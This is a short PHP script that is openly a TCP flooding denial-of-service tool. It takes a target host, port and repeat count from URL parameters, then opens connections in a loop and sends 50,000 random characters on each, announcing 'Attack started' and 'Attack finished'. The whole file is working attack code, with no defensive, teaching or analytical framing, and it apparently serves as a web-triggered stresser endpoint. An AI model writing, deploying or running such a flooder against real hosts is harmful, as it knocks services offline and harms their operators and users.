<?php

header('Content-Type: application/json');

$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];

function makeid($length) {
    $result = '';
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    for($i = 0; $i < $length; $i++) {
        $result .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $result;
}

echo "Attack started\n";

for ($i = 0; $i < $time; $i++) {
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    socket_connect($socket, $host, $port);
    socket_write($socket, makeid(50000));
    socket_close($socket);
}

echo "Attack finished\n";

?>
